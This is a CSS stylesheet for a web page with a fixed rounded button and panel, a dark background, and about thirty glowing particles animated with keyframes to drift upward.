/*@import url('https://fonts.googleapis.com/css?family=Roboto');*/

.btn{
  width: 400px;
  height: 100px;
  position: fixed;
  z-index: 10;
  border-radius: 100px;
  top: 375px;
  left: 550px;
  outline: none;
  border: none;
  box-shadow: 5px 10px 50px;
  font-size: 30px;
  transition: all 0.5s;
}

body {
	font-family: 'Roboto', sans-serif;
	margin: 0;
}

.main {
	background: #fff;
	padding: 25px 30px;
	margin: 50px 0px 15px 0px;
  box-shadow: 5px 10px 50px;
	width: calc(100% - 100px);
	max-width: 1100px;
  border-radius: 1000px;
  position: fixed;
  z-index: 10;
  left: 200px;
  text-align: center;
}
main:nth-child(even) {
	background: #3979b8;
}

h1{
	font-size: 36px;
	font-weight: 400;
	margin: 15px 0;
	text-shadow: 0 2px 5px rgba(0,0,0,.1);
}

p {
    margin: 15px 0;
    width: fit-content;
	font-weight: 100;
	font-size: 18px;
	line-height: 25px;
}
* {
  margin: 0;
  padding: 0;
}

html,
body {
  width: 100%;
  height: 100%;
  overflow: hidden;
}

body {
  background-color: #021027;
}


.container {
  width: 100%;
  height: 100%;
  overflow: hidden;
  position: relative;
  transition: all 0.5s;
}

.text{
	padding: 25px 30px;
	margin: 50px 0px 15px 0px;
	box-shadow: 0 2px 5px rgba(0,0,0,.25);
	width: calc(100% - 100px);
	max-width: 1100px;
	border-radius: 4px;
	font-family: Tahoma, sans-serif;
	background-image: url(bg.gif);
	background-position: bottom right;
	background-repeat: no-repeat;
}

.background {
  display: block;
  position: absolute;
  top: 0;
  left: 0;
  -o-object-fit: cover;
     object-fit: cover;
  width: 100%;
  height: 100%;
  -webkit-mask-image: radial-gradient(white 0%, white 30%, transparent 130%, transparent);
          mask-image: radial-gradient(white 0%, white 30%, transparent 130%, transparent);
}

.circle-container {
  position: absolute;
  -webkit-transform: translateY(-10vh);
          transform: translateY(-10vh);
  -webkit-animation-iteration-count: infinite;
          animation-iteration-count: infinite;
  -webkit-animation-timing-function: linear;
          animation-timing-function: linear;
}
.circle-container .circle {
  width: 100%;
  height: 100%;
  border-radius: 50%;
  mix-blend-mode: screen;
  background-image: radial-gradient(#99ffff, #99ffff 10%, rgba(153, 255, 255, 0) 56%);
  -webkit-animation: fadein-frames 200ms infinite, scale-frames 2s infinite;
          animation: fadein-frames 200ms infinite, scale-frames 2s infinite;
}
@-webkit-keyframes fade-frames {
  0% {
    opacity: 1;
  }
  50% {
    opacity: 0.7;
  }
  100% {
    opacity: 1;
  }
}
@keyframes fade-frames {
  0% {
    opacity: 1;
  }
  50% {
    opacity: 0.7;
  }
  100% {
    opacity: 1;
  }
}
@-webkit-keyframes scale-frames {
  0% {
    -webkit-transform: scale3d(0.4, 0.4, 1);
            transform: scale3d(0.4, 0.4, 1);
  }
  50% {
    -webkit-transform: scale3d(2.2, 2.2, 1);
            transform: scale3d(2.2, 2.2, 1);
  }
  100% {
    -webkit-transform: scale3d(0.4, 0.4, 1);
            transform: scale3d(0.4, 0.4, 1);
  }
}
@keyframes scale-frames {
  0% {
    -webkit-transform: scale3d(0.4, 0.4, 1);
            transform: scale3d(0.4, 0.4, 1);
  }
  50% {
    -webkit-transform: scale3d(2.2, 2.2, 1);
            transform: scale3d(2.2, 2.2, 1);
  }
  100% {
    -webkit-transform: scale3d(0.4, 0.4, 1);
            transform: scale3d(0.4, 0.4, 1);
  }
}
.circle-container:nth-child(1) {
  width: 3px;
  height: 3px;
  -webkit-animation-name: move-frames-1;
          animation-name: move-frames-1;
  -webkit-animation-duration: 33065ms;
          animation-duration: 33065ms;
  -webkit-animation-delay: 17727ms;
          animation-delay: 17727ms;
}
@-webkit-keyframes move-frames-1 {
  from {
    -webkit-transform: translate3d(78vw, 110vh, 0);
            transform: translate3d(78vw, 110vh, 0);
  }
  to {
    -webkit-transform: translate3d(18vw, -115vh, 0);
            transform: translate3d(18vw, -115vh, 0);
  }
}
@keyframes move-frames-1 {
  from {
    -webkit-transform: translate3d(78vw, 110vh, 0);
            transform: translate3d(78vw, 110vh, 0);
  }
  to {
    -webkit-transform: translate3d(18vw, -115vh, 0);
            transform: translate3d(18vw, -115vh, 0);
  }
}
.circle-container:nth-child(1) .circle {
  -webkit-animation-delay: 2032ms;
          animation-delay: 2032ms;
}
.circle-container:nth-child(2) {
  width: 8px;
  height: 8px;
  -webkit-animation-name: move-frames-2;
          animation-name: move-frames-2;
  -webkit-animation-duration: 28118ms;
          animation-duration: 28118ms;
  -webkit-animation-delay: 17647ms;
          animation-delay: 17647ms;
}
@-webkit-keyframes move-frames-2 {
  from {
    -webkit-transform: translate3d(50vw, 105vh, 0);
            transform: translate3d(50vw, 105vh, 0);
  }
  to {
    -webkit-transform: translate3d(47vw, -135vh, 0);
            transform: translate3d(47vw, -135vh, 0);
  }
}
@keyframes move-frames-2 {
  from {
    -webkit-transform: translate3d(50vw, 105vh, 0);
            transform: translate3d(50vw, 105vh, 0);
  }
  to {
    -webkit-transform: translate3d(47vw, -135vh, 0);
            transform: translate3d(47vw, -135vh, 0);
  }
}
.circle-container:nth-child(2) .circle {
  -webkit-animation-delay: 2589ms;
          animation-delay: 2589ms;
}
.circle-container:nth-child(3) {
  width: 1px;
  height: 1px;
  -webkit-animation-name: move-frames-3;
          animation-name: move-frames-3;
  -webkit-animation-duration: 33630ms;
          animation-duration: 33630ms;
  -webkit-animation-delay: 2265ms;
          animation-delay: 2265ms;
}
@-webkit-keyframes move-frames-3 {
  from {
    -webkit-transform: translate3d(92vw, 107vh, 0);
            transform: translate3d(92vw, 107vh, 0);
  }
  to {
    -webkit-transform: translate3d(70vw, -118vh, 0);
            transform: translate3d(70vw, -118vh, 0);
  }
}
@keyframes move-frames-3 {
  from {
    -webkit-transform: translate3d(92vw, 107vh, 0);
            transform: translate3d(92vw, 107vh, 0);
  }
  to {
    -webkit-transform: translate3d(70vw, -118vh, 0);
            transform: translate3d(70vw, -118vh, 0);
  }
}
.circle-container:nth-child(3) .circle {
  -webkit-animation-delay: 89ms;
          animation-delay: 89ms;
}
.circle-container:nth-child(4) {
  width: 1px;
  height: 1px;
  -webkit-animation-name: move-frames-4;
          animation-name: move-frames-4;
  -webkit-animation-duration: 32906ms;
          animation-duration: 32906ms;
  -webkit-animation-delay: 12277ms;
          animation-delay: 12277ms;
}
@-webkit-keyframes move-frames-4 {
  from {
    -webkit-transform: translate3d(76vw, 102vh, 0);
            transform: translate3d(76vw, 102vh, 0);
  }
  to {
    -webkit-transform: translate3d(36vw, -121vh, 0);
            transform: translate3d(36vw, -121vh, 0);
  }
}
@keyframes move-frames-4 {
  from {
    -webkit-transform: translate3d(76vw, 102vh, 0);
            transform: translate3d(76vw, 102vh, 0);
  }
  to {
    -webkit-transform: translate3d(36vw, -121vh, 0);
            transform: translate3d(36vw, -121vh, 0);
  }
}
.circle-container:nth-child(4) .circle {
  -webkit-animation-delay: 2847ms;
          animation-delay: 2847ms;
}
.circle-container:nth-child(5) {
  width: 2px;
  height: 2px;
  -webkit-animation-name: move-frames-5;
          animation-name: move-frames-5;
  -webkit-animation-duration: 30495ms;
          animation-duration: 30495ms;
  -webkit-animation-delay: 17923ms;
          animation-delay: 17923ms;
}
@-webkit-keyframes move-frames-5 {
  from {
    -webkit-transform: translate3d(19vw, 102vh, 0);
            transform: translate3d(19vw, 102vh, 0);
  }
  to {
    -webkit-transform: translate3d(90vw, -130vh, 0);
            transform: translate3d(90vw, -130vh, 0);
  }
}
@keyframes move-frames-5 {
  from {
    -webkit-transform: translate3d(19vw, 102vh, 0);
            transform: translate3d(19vw, 102vh, 0);
  }
  to {
    -webkit-transform: translate3d(90vw, -130vh, 0);
            transform: translate3d(90vw, -130vh, 0);
  }
}
.circle-container:nth-child(5) .circle {
  -webkit-animation-delay: 3398ms;
          animation-delay: 3398ms;
}
.circle-container:nth-child(6) {
  width: 7px;
  height: 7px;
  -webkit-animation-name: move-frames-6;
          animation-name: move-frames-6;
  -webkit-animation-duration: 32705ms;
          animation-duration: 32705ms;
  -webkit-animation-delay: 28022ms;
          animation-delay: 28022ms;
}
@-webkit-keyframes move-frames-6 {
  from {
    -webkit-transform: translate3d(92vw, 107vh, 0);
            transform: translate3d(92vw, 107vh, 0);
  }
  to {
    -webkit-transform: translate3d(52vw, -119vh, 0);
            transform: translate3d(52vw, -119vh, 0);
  }
}
@keyframes move-frames-6 {
  from {
    -webkit-transform: translate3d(92vw, 107vh, 0);
            transform: translate3d(92vw, 107vh, 0);
  }
  to {
    -webkit-transform: translate3d(52vw, -119vh, 0);
            transform: translate3d(52vw, -119vh, 0);
  }
}
.circle-container:nth-child(6) .circle {
  -webkit-animation-delay: 1919ms;
          animation-delay: 1919ms;
}
.circle-container:nth-child(7) {
  width: 8px;
  height: 8px;
  -webkit-animation-name: move-frames-7;
          animation-name: move-frames-7;
  -webkit-animation-duration: 36909ms;
          animation-duration: 36909ms;
  -webkit-animation-delay: 13847ms;
          animation-delay: 13847ms;
}
@-webkit-keyframes move-frames-7 {
  from {
    -webkit-transform: translate3d(53vw, 105vh, 0);
            transform: translate3d(53vw, 105vh, 0);
  }
  to {
    -webkit-transform: translate3d(44vw, -109vh, 0);
            transform: translate3d(44vw, -109vh, 0);
  }
}
@keyframes move-frames-7 {
  from {
    -webkit-transform: translate3d(53vw, 105vh, 0);
            transform: translate3d(53vw, 105vh, 0);
  }
  to {
    -webkit-transform: translate3d(44vw, -109vh, 0);
            transform: translate3d(44vw, -109vh, 0);
  }
}
.circle-container:nth-child(7) .circle {
  -webkit-animation-delay: 275ms;
          animation-delay: 275ms;
}
.circle-container:nth-child(8) {
  width: 6px;
  height: 6px;
  -webkit-animation-name: move-frames-8;
          animation-name: move-frames-8;
  -webkit-animation-duration: 31488ms;
          animation-duration: 31488ms;
  -webkit-animation-delay: 34193ms;
          animation-delay: 34193ms;
}
@-webkit-keyframes move-frames-8 {
  from {
    -webkit-transform: translate3d(93vw, 101vh, 0);
            transform: translate3d(93vw, 101vh, 0);
  }
  to {
    -webkit-transform: translate3d(13vw, -128vh, 0);
            transform: translate3d(13vw, -128vh, 0);
  }
}
@keyframes move-frames-8 {
  from {
    -webkit-transform: translate3d(93vw, 101vh, 0);
            transform: translate3d(93vw, 101vh, 0);
  }
  to {
    -webkit-transform: translate3d(13vw, -128vh, 0);
            transform: translate3d(13vw, -128vh, 0);
  }
}
.circle-container:nth-child(8) .circle {
  -webkit-animation-delay: 1140ms;
          animation-delay: 1140ms;
}
.circle-container:nth-child(9) {
  width: 5px;
  height: 5px;
  -webkit-animation-name: move-frames-9;
          animation-name: move-frames-9;
  -webkit-animation-duration: 32492ms;
          animation-duration: 32492ms;
  -webkit-animation-delay: 29496ms;
          animation-delay: 29496ms;
}
@-webkit-keyframes move-frames-9 {
  from {
    -webkit-transform: translate3d(60vw, 104vh, 0);
            transform: translate3d(60vw, 104vh, 0);
  }
  to {
    -webkit-transform: translate3d(18vw, -123vh, 0);
            transform: translate3d(18vw, -123vh, 0);
  }
}
@keyframes move-frames-9 {
  from {
    -webkit-transform: translate3d(60vw, 104vh, 0);
            transform: translate3d(60vw, 104vh, 0);
  }
  to {
    -webkit-transform: translate3d(18vw, -123vh, 0);
            transform: translate3d(18vw, -123vh, 0);
  }
}
.circle-container:nth-child(9) .circle {
  -webkit-animation-delay: 3894ms;
          animation-delay: 3894ms;
}
.circle-container:nth-child(10) {
  width: 1px;
  height: 1px;
  -webkit-animation-name: move-frames-10;
          animation-name: move-frames-10;
  -webkit-animation-duration: 35980ms;
          animation-duration: 35980ms;
  -webkit-animation-delay: 22743ms;
          animation-delay: 22743ms;
}
@-webkit-keyframes move-frames-10 {
  from {
    -webkit-transform: translate3d(70vw, 102vh, 0);
            transform: translate3d(70vw, 102vh, 0);
  }
  to {
    -webkit-transform: translate3d(49vw, -126vh, 0);
            transform: translate3d(49vw, -126vh, 0);
  }
}
@keyframes move-frames-10 {
  from {
    -webkit-transform: translate3d(70vw, 102vh, 0);
            transform: translate3d(70vw, 102vh, 0);
  }
  to {
    -webkit-transform: translate3d(49vw, -126vh, 0);
            transform: translate3d(49vw, -126vh, 0);
  }
}
.circle-container:nth-child(10) .circle {
  -webkit-animation-delay: 2866ms;
          animation-delay: 2866ms;
}
.circle-container:nth-child(11) {
  width: 3px;
  height: 3px;
  -webkit-animation-name: move-frames-11;
          animation-name: move-frames-11;
  -webkit-animation-duration: 28557ms;
          animation-duration: 28557ms;
  -webkit-animation-delay: 20291ms;
          animation-delay: 20291ms;
}
@-webkit-keyframes move-frames-11 {
  from {
    -webkit-transform: translate3d(13vw, 101vh, 0);
            transform: translate3d(13vw, 101vh, 0);
  }
  to {
    -webkit-transform: translate3d(96vw, -121vh, 0);
            transform: translate3d(96vw, -121vh, 0);
  }
}
@keyframes move-frames-11 {
  from {
    -webkit-transform: translate3d(13vw, 101vh, 0);
            transform: translate3d(13vw, 101vh, 0);
  }
  to {
    -webkit-transform: translate3d(96vw, -121vh, 0);
            transform: translate3d(96vw, -121vh, 0);
  }
}
.circle-container:nth-child(11) .circle {
  -webkit-animation-delay: 3098ms;
          animation-delay: 3098ms;
}
.circle-container:nth-child(12) {
  width: 8px;
  height: 8px;
  -webkit-animation-name: move-frames-12;
          animation-name: move-frames-12;
  -webkit-animation-duration: 32901ms;
          animation-duration: 32901ms;
  -webkit-animation-delay: 16034ms;
          animation-delay: 16034ms;
}
@-webkit-keyframes move-frames-12 {
  from {
    -webkit-transform: translate3d(66vw, 106vh, 0);
            transform: translate3d(66vw, 106vh, 0);
  }
  to {
    -webkit-transform: translate3d(92vw, -131vh, 0);
            transform: translate3d(92vw, -131vh, 0);
  }
}
@keyframes move-frames-12 {
  from {
    -webkit-transform: translate3d(66vw, 106vh, 0);
            transform: translate3d(66vw, 106vh, 0);
  }
  to {
    -webkit-transform: translate3d(92vw, -131vh, 0);
            transform: translate3d(92vw, -131vh, 0);
  }
}
.circle-container:nth-child(12) .circle {
  -webkit-animation-delay: 2081ms;
          animation-delay: 2081ms;
}
.circle-container:nth-child(13) {
  width: 1px;
  height: 1px;
  -webkit-animation-name: move-frames-13;
          animation-name: move-frames-13;
  -webkit-animation-duration: 33245ms;
          animation-duration: 33245ms;
  -webkit-animation-delay: 10330ms;
          animation-delay: 10330ms;
}
@-webkit-keyframes move-frames-13 {
  from {
    -webkit-transform: translate3d(51vw, 101vh, 0);
            transform: translate3d(51vw, 101vh, 0);
  }
  to {
    -webkit-transform: translate3d(85vw, -102vh, 0);
            transform: translate3d(85vw, -102vh, 0);
  }
}
@keyframes move-frames-13 {
  from {
    -webkit-transform: translate3d(51vw, 101vh, 0);
            transform: translate3d(51vw, 101vh, 0);
  }
  to {
    -webkit-transform: translate3d(85vw, -102vh, 0);
            transform: translate3d(85vw, -102vh, 0);
  }
}
.circle-container:nth-child(13) .circle {
  -webkit-animation-delay: 3749ms;
          animation-delay: 3749ms;
}
.circle-container:nth-child(14) {
  width: 2px;
  height: 2px;
  -webkit-animation-name: move-frames-14;
          animation-name: move-frames-14;
  -webkit-animation-duration: 28949ms;
          animation-duration: 28949ms;
  -webkit-animation-delay: 12165ms;
          animation-delay: 12165ms;
}
@-webkit-keyframes move-frames-14 {
  from {
    -webkit-transform: translate3d(94vw, 108vh, 0);
            transform: translate3d(94vw, 108vh, 0);
  }
  to {
    -webkit-transform: translate3d(3vw, -117vh, 0);
            transform: translate3d(3vw, -117vh, 0);
  }
}
@keyframes move-frames-14 {
  from {
    -webkit-transform: translate3d(94vw, 108vh, 0);
            transform: translate3d(94vw, 108vh, 0);
  }
  to {
    -webkit-transform: translate3d(3vw, -117vh, 0);
            transform: translate3d(3vw, -117vh, 0);
  }
}
.circle-container:nth-child(14) .circle {
  -webkit-animation-delay: 3298ms;
          animation-delay: 3298ms;
}
.circle-container:nth-child(15) {
  width: 2px;
  height: 2px;
  -webkit-animation-name: move-frames-15;
          animation-name: move-frames-15;
  -webkit-animation-duration: 34062ms;
          animation-duration: 34062ms;
  -webkit-animation-delay: 25157ms;
          animation-delay: 25157ms;
}
@-webkit-keyframes move-frames-15 {
  from {
    -webkit-transform: translate3d(13vw, 109vh, 0);
            transform: translate3d(13vw, 109vh, 0);
  }
  to {
    -webkit-transform: translate3d(40vw, -114vh, 0);
            transform: translate3d(40vw, -114vh, 0);
  }
}
@keyframes move-frames-15 {
  from {
    -webkit-transform: translate3d(13vw, 109vh, 0);
            transform: translate3d(13vw, 109vh, 0);
  }
  to {
    -webkit-transform: translate3d(40vw, -114vh, 0);
            transform: translate3d(40vw, -114vh, 0);
  }
}
.circle-container:nth-child(15) .circle {
  -webkit-animation-delay: 1245ms;
          animation-delay: 1245ms;
}
.circle-container:nth-child(16) {
  width: 5px;
  height: 5px;
  -webkit-animation-name: move-frames-16;
          animation-name: move-frames-16;
  -webkit-animation-duration: 28527ms;
          animation-duration: 28527ms;
  -webkit-animation-delay: 33499ms;
          animation-delay: 33499ms;
}
@-webkit-keyframes move-frames-16 {
  from {
    -webkit-transform: translate3d(32vw, 101vh, 0);
            transform: translate3d(32vw, 101vh, 0);
  }
  to {
    -webkit-transform: translate3d(69vw, -131vh, 0);
            transform: translate3d(69vw, -131vh, 0);
  }
}
@keyframes move-frames-16 {
  from {
    -webkit-transform: translate3d(32vw, 101vh, 0);
            transform: translate3d(32vw, 101vh, 0);
  }
  to {
    -webkit-transform: translate3d(69vw, -131vh, 0);
            transform: translate3d(69vw, -131vh, 0);
  }
}
.circle-container:nth-child(16) .circle {
  -webkit-animation-delay: 1859ms;
          animation-delay: 1859ms;
}
.circle-container:nth-child(17) {
  width: 8px;
  height: 8px;
  -webkit-animation-name: move-frames-17;
          animation-name: move-frames-17;
  -webkit-animation-duration: 32022ms;
          animation-duration: 32022ms;
  -webkit-animation-delay: 794ms;
          animation-delay: 794ms;
}
@-webkit-keyframes move-frames-17 {
  from {
    -webkit-transform: translate3d(5vw, 107vh, 0);
            transform: translate3d(5vw, 107vh, 0);
  }
  to {
    -webkit-transform: translate3d(11vw, -120vh, 0);
            transform: translate3d(11vw, -120vh, 0);
  }
}
@keyframes move-frames-17 {
  from {
    -webkit-transform: translate3d(5vw, 107vh, 0);
            transform: translate3d(5vw, 107vh, 0);
  }
  to {
    -webkit-transform: translate3d(11vw, -120vh, 0);
            transform: translate3d(11vw, -120vh, 0);
  }
}
.circle-container:nth-child(17) .circle {
  -webkit-animation-delay: 1621ms;
          animation-delay: 1621ms;
}
.circle-container:nth-child(18) {
  width: 4px;
  height: 4px;
  -webkit-animation-name: move-frames-18;
          animation-name: move-frames-18;
  -webkit-animation-duration: 31789ms;
          animation-duration: 31789ms;
  -webkit-animation-delay: 30687ms;
          animation-delay: 30687ms;
}
@-webkit-keyframes move-frames-18 {
  from {
    -webkit-transform: translate3d(95vw, 106vh, 0);
            transform: translate3d(95vw, 106vh, 0);
  }
  to {
    -webkit-transform: translate3d(13vw, -107vh, 0);
            transform: translate3d(13vw, -107vh, 0);
  }
}
@keyframes move-frames-18 {
  from {
    -webkit-transform: translate3d(95vw, 106vh, 0);
            transform: translate3d(95vw, 106vh, 0);
  }
  to {
    -webkit-transform: translate3d(13vw, -107vh, 0);
            transform: translate3d(13vw, -107vh, 0);
  }
}
.circle-container:nth-child(18) .circle {
  -webkit-animation-delay: 3735ms;
          animation-delay: 3735ms;
}
.circle-container:nth-child(19) {
  width: 7px;
  height: 7px;
  -webkit-animation-name: move-frames-19;
          animation-name: move-frames-19;
  -webkit-animation-duration: 30367ms;
          animation-duration: 30367ms;
  -webkit-animation-delay: 24109ms;
          animation-delay: 24109ms;
}
@-webkit-keyframes move-frames-19 {
  from {
    -webkit-transform: translate3d(16vw, 105vh, 0);
            transform: translate3d(16vw, 105vh, 0);
  }
  to {
    -webkit-transform: translate3d(80vw, -134vh, 0);
            transform: translate3d(80vw, -134vh, 0);
  }
}
@keyframes move-frames-19 {
  from {
    -webkit-transform: translate3d(16vw, 105vh, 0);
            transform: translate3d(16vw, 105vh, 0);
  }
  to {
    -webkit-transform: translate3d(80vw, -134vh, 0);
            transform: translate3d(80vw, -134vh, 0);
  }
}
.circle-container:nth-child(19) .circle {
  -webkit-animation-delay: 2010ms;
          animation-delay: 2010ms;
}
.circle-container:nth-child(20) {
  width: 5px;
  height: 5px;
  -webkit-animation-name: move-frames-20;
          animation-name: move-frames-20;
  -webkit-animation-duration: 32942ms;
          animation-duration: 32942ms;
  -webkit-animation-delay: 17077ms;
          animation-delay: 17077ms;
}
@-webkit-keyframes move-frames-20 {
  from {
    -webkit-transform: translate3d(43vw, 102vh, 0);
            transform: translate3d(43vw, 102vh, 0);
  }
  to {
    -webkit-transform: translate3d(65vw, -132vh, 0);
            transform: translate3d(65vw, -132vh, 0);
  }
}
@keyframes move-frames-20 {
  from {
    -webkit-transform: translate3d(43vw, 102vh, 0);
            transform: translate3d(43vw, 102vh, 0);
  }
  to {
    -webkit-transform: translate3d(65vw, -132vh, 0);
            transform: translate3d(65vw, -132vh, 0);
  }
}
.circle-container:nth-child(20) .circle {
  -webkit-animation-delay: 3718ms;
          animation-delay: 3718ms;
}
.circle-container:nth-child(21) {
  width: 7px;
  height: 7px;
  -webkit-animation-name: move-frames-21;
          animation-name: move-frames-21;
  -webkit-animation-duration: 32850ms;
          animation-duration: 32850ms;
  -webkit-animation-delay: 21276ms;
          animation-delay: 21276ms;
}
@-webkit-keyframes move-frames-21 {
  from {
    -webkit-transform: translate3d(50vw, 104vh, 0);
            transform: translate3d(50vw, 104vh, 0);
  }
  to {
    -webkit-transform: translate3d(49vw, -130vh, 0);
            transform: translate3d(49vw, -130vh, 0);
  }
}
@keyframes move-frames-21 {
  from {
    -webkit-transform: translate3d(50vw, 104vh, 0);
            transform: translate3d(50vw, 104vh, 0);
  }
  to {
    -webkit-transform: translate3d(49vw, -130vh, 0);
            transform: translate3d(49vw, -130vh, 0);
  }
}
.circle-container:nth-child(21) .circle {
  -webkit-animation-delay: 3519ms;
          animation-delay: 3519ms;
}
.circle-container:nth-child(22) {
  width: 2px;
  height: 2px;
  -webkit-animation-name: move-frames-22;
          animation-name: move-frames-22;
  -webkit-animation-duration: 31783ms;
          animation-duration: 31783ms;
  -webkit-animation-delay: 17575ms;
          animation-delay: 17575ms;
}
@-webkit-keyframes move-frames-22 {
  from {
    -webkit-transform: translate3d(13vw, 110vh, 0);
            transform: translate3d(13vw, 110vh, 0);
  }
  to {
    -webkit-transform: translate3d(70vw, -140vh, 0);
            transform: translate3d(70vw, -140vh, 0);
  }
}
@keyframes move-frames-22 {
  from {
    -webkit-transform: translate3d(13vw, 110vh, 0);
            transform: translate3d(13vw, 110vh, 0);
  }
  to {
    -webkit-transform: translate3d(70vw, -140vh, 0);
            transform: translate3d(70vw, -140vh, 0);
  }
}
.circle-container:nth-child(22) .circle {
  -webkit-animation-delay: 1643ms;
          animation-delay: 1643ms;
}
.circle-container:nth-child(23) {
  width: 7px;
  height: 7px;
  -webkit-animation-name: move-frames-23;
          animation-name: move-frames-23;
  -webkit-animation-duration: 32480ms;
          animation-duration: 32480ms;
  -webkit-animation-delay: 20507ms;
          animation-delay: 20507ms;
}
@-webkit-keyframes move-frames-23 {
  from {
    -webkit-transform: translate3d(27vw, 101vh, 0);
            transform: translate3d(27vw, 101vh, 0);
  }
  to {
    -webkit-transform: translate3d(54vw, -102vh, 0);
            transform: translate3d(54vw, -102vh, 0);
  }
}
@keyframes move-frames-23 {
  from {
    -webkit-transform: translate3d(27vw, 101vh, 0);
            transform: translate3d(27vw, 101vh, 0);
  }
  to {
    -webkit-transform: translate3d(54vw, -102vh, 0);
            transform: translate3d(54vw, -102vh, 0);
  }
}
.circle-container:nth-child(23) .circle {
  -webkit-animation-delay: 2444ms;
          animation-delay: 2444ms;
}
.circle-container:nth-child(24) {
  width: 5px;
  height: 5px;
  -webkit-animation-name: move-frames-24;
          animation-name: move-frames-24;
  -webkit-animation-duration: 34802ms;
          animation-duration: 34802ms;
  -webkit-animation-delay: 31613ms;
          animation-delay: 31613ms;
}
@-webkit-keyframes move-frames-24 {
  from {
    -webkit-transform: translate3d(98vw, 110vh, 0);
            transform: translate3d(98vw, 110vh, 0);
  }
  to {
    -webkit-transform: translate3d(94vw, -129vh, 0);
            transform: translate3d(94vw, -129vh, 0);
  }
}
@keyframes move-frames-24 {
  from {
    -webkit-transform: translate3d(98vw, 110vh, 0);
            transform: translate3d(98vw, 110vh, 0);
  }
  to {
    -webkit-transform: translate3d(94vw, -129vh, 0);
            transform: translate3d(94vw, -129vh, 0);
  }
}
.circle-container:nth-child(24) .circle {
  -webkit-animation-delay: 304ms;
          animation-delay: 304ms;
}
.circle-container:nth-child(25) {
  width: 7px;
  height: 7px;
  -webkit-animation-name: move-frames-25;
          animation-name: move-frames-25;
  -webkit-animation-duration: 32162ms;
          animation-duration: 32162ms;
  -webkit-animation-delay: 9993ms;
          animation-delay: 9993ms;
}
@-webkit-keyframes move-frames-25 {
  from {
    -webkit-transform: translate3d(30vw, 105vh, 0);
            transform: translate3d(30vw, 105vh, 0);
  }
  to {
    -webkit-transform: translate3d(95vw, -132vh, 0);
            transform: translate3d(95vw, -132vh, 0);
  }
}
@keyframes move-frames-25 {
  from {
    -webkit-transform: translate3d(30vw, 105vh, 0);
            transform: translate3d(30vw, 105vh, 0);
  }
  to {
    -webkit-transform: translate3d(95vw, -132vh, 0);
            transform: translate3d(95vw, -132vh, 0);
  }
}
.circle-container:nth-child(25) .circle {
  -webkit-animation-delay: 2683ms;
          animation-delay: 2683ms;
}
.circle-container:nth-child(26) {
  width: 3px;
  height: 3px;
  -webkit-animation-name: move-frames-26;
          animation-name: move-frames-26;
  -webkit-animation-duration: 28250ms;
          animation-duration: 28250ms;
  -webkit-animation-delay: 13945ms;
          animation-delay: 13945ms;
}
@-webkit-keyframes move-frames-26 {
  from {
    -webkit-transform: translate3d(10vw, 104vh, 0);
            transform: translate3d(10vw, 104vh, 0);
  }
  to {
    -webkit-transform: translate3d(29vw, -118vh, 0);
            transform: translate3d(29vw, -118vh, 0);
  }
}
@keyframes move-frames-26 {
  from {
    -webkit-transform: translate3d(10vw, 104vh, 0);
            transform: translate3d(10vw, 104vh, 0);
  }
  to {
    -webkit-transform: translate3d(29vw, -118vh, 0);
            transform: translate3d(29vw, -118vh, 0);
  }
}
.circle-container:nth-child(26) .circle {
  -webkit-animation-delay: 3307ms;
          animation-delay: 3307ms;
}
.circle-container:nth-child(27) {
  width: 6px;
  height: 6px;
  -webkit-animation-name: move-frames-27;
          animation-name: move-frames-27;
  -webkit-animation-duration: 30709ms;
          animation-duration: 30709ms;
  -webkit-animation-delay: 29528ms;
          animation-delay: 29528ms;
}
@-webkit-keyframes move-frames-27 {
  from {
    -webkit-transform: translate3d(33vw, 103vh, 0);
            transform: translate3d(33vw, 103vh, 0);
  }
  to {
    -webkit-transform: translate3d(40vw, -107vh, 0);
            transform: translate3d(40vw, -107vh, 0);
  }
}
@keyframes move-frames-27 {
  from {
    -webkit-transform: translate3d(33vw, 103vh, 0);
            transform: translate3d(33vw, 103vh, 0);
  }
  to {
    -webkit-transform: translate3d(40vw, -107vh, 0);
            transform: translate3d(40vw, -107vh, 0);
  }
}
.circle-container:nth-child(27) .circle {
  -webkit-animation-delay: 3091ms;
          animation-delay: 3091ms;
}
.circle-container:nth-child(28) {
  width: 4px;
  height: 4px;
  -webkit-animation-name: move-frames-28;
          animation-name: move-frames-28;
  -webkit-animation-duration: 33635ms;
          animation-duration: 33635ms;
  -webkit-animation-delay: 1001ms;
          animation-delay: 1001ms;
}
@-webkit-keyframes move-frames-28 {
  from {
    -webkit-transform: translate3d(5vw, 102vh, 0);
            transform: translate3d(5vw, 102vh, 0);
  }
  to {
    -webkit-transform: translate3d(73vw, -127vh, 0);
            transform: translate3d(73vw, -127vh, 0);
  }
}
@keyframes move-frames-28 {
  from {
    -webkit-transform: translate3d(5vw, 102vh, 0);
            transform: translate3d(5vw, 102vh, 0);
  }
  to {
    -webkit-transform: translate3d(73vw, -127vh, 0);
            transform: translate3d(73vw, -127vh, 0);
  }
}
.circle-container:nth-child(28) .circle {
  -webkit-animation-delay: 841ms;
          animation-delay: 841ms;
}
.circle-container:nth-child(29) {
  width: 3px;
  height: 3px;
  -webkit-animation-name: move-frames-29;
          animation-name: move-frames-29;
  -webkit-animation-duration: 33570ms;
          animation-duration: 33570ms;
  -webkit-animation-delay: 19919ms;
          animation-delay: 19919ms;
}
@-webkit-keyframes move-frames-29 {
  from {
    -webkit-transform: translate3d(87vw, 109vh, 0);
            transform: translate3d(87vw, 109vh, 0);
  }
  to {
    -webkit-transform: translate3d(52vw, -120vh, 0);
            transform: translate3d(52vw, -120vh, 0);
  }
}
@keyframes move-frames-29 {
  from {
    -webkit-transform: translate3d(87vw, 109vh, 0);
            transform: translate3d(87vw, 109vh, 0);
  }
  to {
    -webkit-transform: translate3d(52vw, -120vh, 0);
            transform: translate3d(52vw, -120vh, 0);
  }
}
.circle-container:nth-child(29) .circle {
  -webkit-animation-delay: 883ms;
          animation-delay: 883ms;
}
.circle-container:nth-child(30) {
  width: 6px;
  height: 6px;
  -webkit-animation-name: move-frames-30;
          animation-name: move-frames-30;
  -webkit-animation-duration: 32265ms;
          animation-duration: 32265ms;
  -webkit-animation-delay: 30172ms;
          animation-delay: 30172ms;
}
@-webkit-keyframes move-frames-30 {
  from {
    -webkit-transform: translate3d(81vw, 107vh, 0);
            transform: translate3d(81vw, 107vh, 0);
  }
  to {
    -webkit-transform: translate3d(49vw, -111vh, 0);
            transform: translate3d(49vw, -111vh, 0);
  }
}
@keyframes move-frames-30 {
  from {
    -webkit-transform: translate3d(81vw, 107vh, 0);
            transform: translate3d(81vw, 107vh, 0);
  }
  to {
    -webkit-transform: translate3d(49vw, -111vh, 0);
            transform: translate3d(49vw, -111vh, 0);
  }
}
